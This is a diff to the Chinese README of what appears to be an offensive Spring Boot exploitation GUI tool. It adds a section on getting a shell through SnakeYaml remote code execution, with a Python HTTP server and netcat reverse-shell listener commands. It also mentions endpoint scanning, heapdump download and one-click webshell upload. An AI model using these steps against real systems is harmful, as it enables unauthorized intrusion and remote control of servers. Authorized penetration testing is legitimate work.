@@ -81,7 +81,7 @@ java -jar SpringBootVul_GUI.jar
 * [x] logging.config的logback基于JNDI的RCE
 * [x] CVE-2021-21234任意文件读取
 * [x] h2数据库的控制台基于JNDI注入的RCE
-* [ ] SpringCloud的SnakeYaml的RCE
+* [x] SpringCloud的SnakeYaml的RCE
 * [ ] jolokia中logback基于JNDI注入的RCE
 * [ ] jolokia中realm基于JNDI注入的RCE
 * [ ] mysql中jdbc基于反序列化的RCE
@@ -269,13 +269,35 @@ nc -lvp 7777
 
 https://tttang.com/archive/1405/
 
-### #12 端点扫描
+### #12 SnakeYamlRCE
+
+漏洞触发流程：
+
+SnakeYamlYml.yml - > SnakeYaml.jar - > getshell
+
+端口监听默认是9950，监听port填的是托管服务的端口
+
+**注意**：该exp会发送到对方服务器，而对方服务器的env会显示500，比如这种，在测试结束后需要通知对方重启服务器获得正常显示。
+
+**小Tips**：该漏洞的yml文件调用jar包加载，若重复发送同名的jar包会导致漏洞利用失败，故该模块用了递增的形式一直改变生成jar包名而到达无限弹shell
+
+```bash
+python -m http.server 80 
+nc -lvk 9950 #mac
+nc -lvp 9950 #linux
+```
+
+![](./image/image-20241010151640105.png)
+
+![](./image/image-20241010151607414.png)
+
+### #13 端点扫描
 
 端点扫描经过延时降速处理，heapdump可以下载大文件，用了分块，做了个小进度条，以后优化下，textflow布局以后要改
 
 ![](./image/image-20240914013633068.png)
 
-### #13 一键上马
+### #14 一键上马
 
 ![](./image/WechatIMG1409.jpg)
 
